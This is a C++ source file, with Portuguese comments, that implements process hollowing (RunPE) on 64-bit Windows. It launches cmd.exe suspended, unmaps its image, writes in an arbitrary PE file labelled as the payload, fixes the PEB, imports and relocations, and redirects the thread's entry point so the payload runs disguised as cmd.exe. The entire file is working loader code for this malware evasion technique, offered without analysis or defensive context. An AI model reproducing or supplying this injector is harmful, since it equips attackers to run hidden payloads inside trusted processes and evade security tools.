#include <Windows.h>
#include <iostream>
#include <string>
#include <shlobj.h>
#include <winternl.h>
#include "utils.h"





int main() {
    std::string path = openFile( "PE FILE (*.exe;*.dll)\0*.exe;*.dll\0" );

    if ( path.empty() ) {
        std::cerr << "openFile err" << std::endl;
        return 1;
    }
 
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};

    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si );
    ZeroMemory( &pi, sizeof( pi ) );


    if ( !CreateProcessA( "C:\\Windows\\system32\\cmd.exe", 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi ) ) {
        std::cerr << "CreateProcessA:" << GetLastError();
        return 1;

    }




    HANDLE f = CreateFileA( path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr );
    if ( f == INVALID_HANDLE_VALUE ) {
        std::cerr << "CreateFileA:" << GetLastError();
        return 1;
    }

    DWORD fileSize = GetFileSize( f, nullptr );
    BYTE* dataAddy = (BYTE*) VirtualAllocEx(pi.hProcess,0, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ;
    if ( dataAddy == 0 ) {
        std::cerr << "VirtualAllocEx 1 : " << GetLastError();
        CloseHandle( f );
        return 1;
    }

    DWORD bytesRead;
    BYTE* data = ( BYTE* ) ( HeapAlloc( GetProcessHeap(), 0, fileSize ) );
    if ( !ReadFile( f, data, fileSize, &bytesRead, nullptr ) || bytesRead != fileSize ) {
        std::cerr << "ReadFile: " << GetLastError();
        HeapFree( GetProcessHeap(), 0, data );
        CloseHandle( f );
        return 1;
    }
    CloseHandle( f );

    if ( !WriteProcessMemory( pi.hProcess, dataAddy, data, fileSize, 0 ) ) {
        std::cerr << "WriteProcessMemory1:" << GetLastError();
        HeapFree( GetProcessHeap(), 0, data );
        return 1;

    }

    auto dos = reinterpret_cast< PIMAGE_DOS_HEADER >( data );
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) {
        std::cerr << "invalid e_magic " << std::endl;
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }

    auto nt = reinterpret_cast< PIMAGE_NT_HEADERS >( data + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ) {
        std::cerr << "only x64 pe" << std::endl;
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }

 
    // unmap pe original

    using pNtUnmapViewOfSection = LONG( NTAPI* )( HANDLE, PVOID );
    auto NtUnmapViewOfSection = ( pNtUnmapViewOfSection ) GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtUnmapViewOfSection" );

    if ( NtUnmapViewOfSection ) {
        PVOID imageBase_ = GetImageBase( pi.hProcess );
        if ( imageBase_ ) {
            NtUnmapViewOfSection( pi.hProcess, imageBase_ );
        }
    }

    // alocando espaço para o payload
    int imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE* imageBase = ( BYTE* ) VirtualAllocEx( pi.hProcess, ( LPVOID ) nt->OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( !imageBase ) {
        std::cerr << "VirtualAllocEx 2 : " << GetLastError();
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }

    // fix  peb : ImageBaseAddress
    PROCESS_BASIC_INFORMATION pbi{};
    ULONG retSz = 0;

    NtQueryInformationProcessT NtQueryInformationProcess = reinterpret_cast< NtQueryInformationProcessT > ( GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationProcess" ) );

    if ( !NtQueryInformationProcess || NtQueryInformationProcess( pi.hProcess, ProcessBasicInformation, &pbi, sizeof( pbi ), &retSz ) ) {
        std::cerr << "NtQueryInformationProcess:" << GetLastError();
        return 1;
    }

    PVOID peb_imgbase = ( PBYTE ) pbi.PebBaseAddress + 0x10;

    if ( !WriteProcessMemory( pi.hProcess, peb_imgbase, &imageBase, sizeof( imageBase ), nullptr ) ) {
        std::cerr << "WriteProcessMemory2: " << GetLastError() << "\n";
        return 1;
    }


    // escrevendo o payload 
    if ( !WriteProcessMemory( pi.hProcess, imageBase, data, nt->OptionalHeader.SizeOfHeaders, 0 )) {
        std::cerr << "WriteProcessMemory3:" << GetLastError();
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }


 
    //mapeando as sections do .exe pra a ram
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION( nt );
    for ( int i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
        auto& s = sections[i];
        if ( s.PointerToRawData + s.SizeOfRawData > fileSize || s.VirtualAddress + s.SizeOfRawData > imageSize )
            continue;

        if ( !WriteProcessMemory( pi.hProcess, imageBase + s.VirtualAddress, data + s.PointerToRawData, s.SizeOfRawData, 0 ) ) {
            std::cerr << "WriteProcessMemory4:" << GetLastError();
            HeapFree( GetProcessHeap(), 0, data );
            return 1;
        }
    }

    // importar dlls
    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if ( !importDir.Size ) {
        std::cerr << "Invalid IMAGE_DIRECTORY_ENTRY_IMPORT: " << GetLastError() << "\n";
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }

    constexpr int MAX_IMPORTS = 256;
    IMAGE_IMPORT_DESCRIPTOR importDescs[MAX_IMPORTS]{};

    if ( !ReadProcessMemory( pi.hProcess, imageBase + importDir.VirtualAddress, importDescs, sizeof( importDescs ), nullptr ) ) {
        std::cerr << "ReadProcessMemory1: " << GetLastError() << "\n";
        HeapFree( GetProcessHeap(), 0, data );
        return 1;
    }

    for ( int i = 0; importDescs[i].Name != 0; i++ ) {
        char dllName[MAX_PATH]{};
        if ( !ReadProcessMemory( pi.hProcess, imageBase + importDescs[i].Name, dllName, sizeof( dllName ), nullptr ) ) {
            std::cerr << "ReadProcessMemory2: " << GetLastError() << "\n";
            return 1;
            break;
        }

        HMODULE hMod = LoadLibraryA( dllName );
        if ( !hMod ) {
            std::cerr << "LoadLibraryA1: " << GetLastError() << "\n";
            HeapFree( GetProcessHeap(), 0, data );
            return 1;
        }

        uintptr_t thunkRVA = importDescs[i].FirstThunk;
        uintptr_t origThunkRVA = importDescs[i].OriginalFirstThunk ? importDescs[i].OriginalFirstThunk : thunkRVA;

        uintptr_t thunk[256]{};
        uintptr_t origThunk[256]{};

        if ( !ReadProcessMemory( pi.hProcess, imageBase + thunkRVA, thunk, sizeof( thunk ), nullptr ) || !ReadProcessMemory( pi.hProcess, imageBase + origThunkRVA, origThunk, sizeof( origThunk ), nullptr ) ) {
            std::cerr << "ReadProcessMemory3: " << GetLastError() << "\n";
            return 1;
            break;
        }

        for ( int j = 0; origThunk[j]; j++ ) {
            FARPROC resolved = nullptr;

            if ( IMAGE_SNAP_BY_ORDINAL( origThunk[j] ) ) {
                resolved = GetProcAddress( hMod, reinterpret_cast< const char* >( origThunk[j] & 0xFFFF ) );
            }
            else {
                IMAGE_IMPORT_BY_NAME importByName{};
                if ( !ReadProcessMemory( pi.hProcess, imageBase + origThunk[j], &importByName, sizeof( importByName ), nullptr ) ) {
                    std::cerr << "ReadProcessMemory4: " << GetLastError() << "\n";
                    return 1;
                    break;
                }

                char functName[256]{};
                if ( !ReadProcessMemory( pi.hProcess, imageBase + origThunk[j] + offsetof( IMAGE_IMPORT_BY_NAME, Name ), functName, sizeof( functName ), nullptr ) ) {
                    std::cerr << "ReadProcessMemory5: " << GetLastError() << "\n";
                    return 1;
                    break;
                }

                resolved = GetProcAddress( hMod, functName );
            }

            if ( !resolved ) {
                std::cerr << "GetProcAddress: " << GetLastError() << "\n";
                return 1;
            }

            uintptr_t funcAddy = reinterpret_cast< uintptr_t >( resolved );
            if ( !WriteProcessMemory( pi.hProcess, imageBase + thunkRVA + j * sizeof( uintptr_t ), &funcAddy, sizeof( funcAddy ), nullptr ) ) {
                std::cerr << "WriteProcessMemory5: " << GetLastError() << "\n";
                break;
            }
        }
    }

  

    // relloc
    uintptr_t delta = reinterpret_cast< uintptr_t >( imageBase ) - nt->OptionalHeader.ImageBase;
    auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if ( delta && relocDir.Size ) {
        DWORD relocSize = relocDir.Size;
        DWORD relocRVA = relocDir.VirtualAddress;

        BYTE* relocData = new BYTE[relocSize];
        if ( !ReadProcessMemory( pi.hProcess, imageBase + relocRVA, relocData, relocSize, nullptr ) ) {
            std::cerr << "ReadProcessMemory6: " << GetLastError() << "\n";
            delete[] relocData;
            return 1;
        }

        PIMAGE_BASE_RELOCATION reloc = reinterpret_cast< PIMAGE_BASE_RELOCATION >( relocData );
        BYTE* relocEnd = relocData + relocSize;

        while ( reinterpret_cast< BYTE* >( reloc ) < relocEnd && reloc->SizeOfBlock ) {
            DWORD count = ( reloc->SizeOfBlock - sizeof( IMAGE_BASE_RELOCATION ) ) / sizeof( WORD );
            WORD* relocEntries = reinterpret_cast< WORD* >( reloc + 1 );

            for ( DWORD i = 0; i < count; i++ ) {
                WORD typeOffset = relocEntries[i];
                WORD type = typeOffset >> 12;
                WORD offset = typeOffset & 0x0FFF;

                if ( type == IMAGE_REL_BASED_DIR64 ) {
                    uintptr_t patchAddr = reinterpret_cast< uintptr_t >( imageBase ) + reloc->VirtualAddress + offset;

                    uintptr_t ogValue = 0;
                    if ( !ReadProcessMemory( pi.hProcess, reinterpret_cast< LPCVOID >( patchAddr ), &ogValue, sizeof( ogValue ), nullptr ) ) {
                        std::cerr << "ReadProcessMemory7: " << GetLastError() << "\n";
                        continue;
                    }

                    uint64_t newValue = ogValue + delta;

                    if ( !WriteProcessMemory( pi.hProcess, reinterpret_cast< LPVOID >( patchAddr ), &newValue, sizeof( newValue ), nullptr ) ) {
                        std::cerr << "WriteProcessMemory6: " << GetLastError() << "\n";
                        continue;
                    }
                }
            }

            reloc = reinterpret_cast< PIMAGE_BASE_RELOCATION >( reinterpret_cast< BYTE* >( reloc ) + reloc->SizeOfBlock );
        }

        delete[] relocData;
    }

    // alterar proteções de cada section
    for ( int i = 0; i < nt->FileHeader.NumberOfSections; ++i ) {
        auto& s = sections[i];
        DWORD protect = getProts( s.Characteristics );
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, imageBase + s.VirtualAddress, s.Misc.VirtualSize, protect, &oldProtect );
    }

    //exec tls_callbacks
    auto& tlsDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if ( tlsDir.VirtualAddress && tlsDir.Size ) {
        IMAGE_TLS_DIRECTORY64 tls{};
        if ( !ReadProcessMemory( pi.hProcess, imageBase + tlsDir.VirtualAddress, &tls, sizeof( tls ), nullptr ) ) {
            std::cerr << "ReadProcessMemory7: " << GetLastError() << "\n";
            return 1;
        }

        ULONGLONG callbackAddy = tls.AddressOfCallBacks;
        if ( !callbackAddy ) {
            std::cerr << "callbackAddy era nullptr\n";
            return 0;
        }

        ULONGLONG callbacks[64]{};

        if ( !ReadProcessMemory( pi.hProcess, ( LPCVOID ) callbackAddy, &callbacks, sizeof( callbacks ), nullptr ) ) {
            std::cerr << "ReadProcessMemory8: " << GetLastError() << "\n";
            return 1;
        }

        for ( int i = 0; callbacks[i]; i++ ) {
            HANDLE hThread = CreateRemoteThread(pi.hProcess,nullptr,0,( LPTHREAD_START_ROUTINE ) callbacks[i],( LPVOID ) imageBase,0,nullptr);

            if ( !hThread ) {
                std::cerr << "CreateRemoteThread: " << GetLastError() << "\n";
                continue;
            }

            WaitForSingleObject( hThread, INFINITE );
            CloseHandle( hThread );
        }
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if ( !GetThreadContext( pi.hThread , &ctx )) {
        std::cerr << "GetThreadContext: " << GetLastError() << "\n";
        return 1;
    }

    ctx.Rip = ( DWORD64 ) ( imageBase + nt->OptionalHeader.AddressOfEntryPoint );

    if ( !SetThreadContext( pi.hThread, &ctx ) ) {
        std::cerr << "SetThreadContext: " << GetLastError() << "\n";
        return 1;
    }

    DWORD count;
    do {
        count = ResumeThread( pi.hThread );
    } while ( count > 1 );

    WaitForSingleObject( pi.hThread, INFINITE );

    return 0;
}


